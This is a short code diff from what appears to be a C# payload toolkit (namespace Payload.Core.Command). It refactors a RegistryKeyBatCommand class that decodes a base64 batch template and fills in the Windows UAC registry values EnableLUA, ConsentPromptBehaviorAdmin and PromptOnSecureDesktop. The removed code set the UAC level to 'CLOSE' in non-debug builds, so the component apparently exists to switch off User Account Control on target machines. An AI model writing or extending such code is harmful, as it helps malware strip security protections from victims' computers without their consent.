@@ -30,7 +30,7 @@ PromptOnSecureDesktop：0
 */
 namespace Payload.Core.Command
 {
-    public class RegistryKeyBatCommand : Payload.Command.Interface.ICommand
+    public class RegistryKeyBatCommand : IUacCommand
     {
         private static readonly string _TagPrefix = "{{###";
         private static readonly string _Tagsupfix = "###}}";
@@ -54,11 +54,9 @@ namespace Payload.Core.Command
         {
             string uacBatText = TextHelper.Base64Decode(_UacBase64ToBeConfig);
 
-            UacConifg.UAC_TYPE uacLevel = Config.IsDebug()? UacConifg.UAC_TYPE.HIGH : UacConifg.UAC_TYPE.CLOSE;
-
-            uacBatText = uacBatText.Replace(_ConsentPromptBehaviorAdmin_Tag, UacConifg.GetUacConfig(uacLevel, UacConifg.ConsentPromptBehaviorAdmin_Name).ToString());
-            uacBatText = uacBatText.Replace(_EnableLUA_Tag, UacConifg.GetUacConfig(uacLevel, UacConifg.EnableLUA_Name).ToString());
-            uacBatText = uacBatText.Replace(_PromptOnSecureDesktop_Tag, UacConifg.GetUacConfig(uacLevel, UacConifg.PromptOnSecureDesktop_Name).ToString());
+            uacBatText = uacBatText.Replace(_ConsentPromptBehaviorAdmin_Tag, UacConifg.GetUacConfig(UacLevel, UacConifg.ConsentPromptBehaviorAdmin_Name).ToString());
+            uacBatText = uacBatText.Replace(_EnableLUA_Tag, UacConifg.GetUacConfig(UacLevel, UacConifg.EnableLUA_Name).ToString());
+            uacBatText = uacBatText.Replace(_PromptOnSecureDesktop_Tag, UacConifg.GetUacConfig(UacLevel, UacConifg.PromptOnSecureDesktop_Name).ToString());
 #if DEBUG
             uacBatText += "pause";
             Console.WriteLine(uacBatText);
